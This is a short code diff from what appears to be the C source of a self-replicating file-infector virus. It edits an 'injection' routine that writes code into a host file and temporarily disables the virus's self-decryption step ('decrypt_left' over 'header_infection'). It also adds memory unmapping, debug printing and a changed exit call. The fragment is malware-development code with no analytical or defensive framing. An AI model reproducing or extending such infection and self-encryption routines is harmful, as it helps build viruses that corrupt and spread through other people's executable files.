@@ -167,7 +167,7 @@ __attribute__((always_inline)) static inline void replicate_on_memory(const stru
 
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+//	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
 	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
 	if (context == FAILURE)
@@ -197,7 +197,10 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	_write(fd, ptr, filesize);
 	_close(fd);
 	_munmap(ptr, filesize);
+	_munmap(host->header, host->filesize);
 
 label:
-	__exit(host, keychain, context);
+	(void)keychain;
+	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+	__exit(host->stack);
 }
